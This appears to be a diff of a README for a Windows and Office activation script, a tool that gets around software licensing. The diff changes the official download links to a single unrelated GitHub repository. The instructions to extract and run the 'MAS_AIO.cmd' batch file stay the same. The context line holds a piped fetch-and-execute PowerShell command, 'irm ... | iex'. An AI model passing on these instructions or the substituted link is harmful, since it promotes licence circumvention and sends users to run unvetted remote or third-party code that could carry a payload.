@@ -26,9 +26,9 @@ irm https://get.activated.win | iex
   <summary>Click here for info</summary>
 
 1.   Download the file using the links provided below.  
-`https://github.com/massgravel/Microsoft-Activation-Scripts/archive/refs/heads/master.zip`  
+`https://github.com/Padaki89/Windows-Office-Activator.git`  
 or  
-`https://git.activated.win/massgrave/Microsoft-Activation-Scripts/archive/master.zip`
+`https://github.com/Padaki89/Windows-Office-Activator.git`
 2.   Right-click on the downloaded zip file and extract
 3.   In the extracted folder, find the folder named `All-In-One-Version`
 4.   Run the file named `MAS_AIO.cmd`
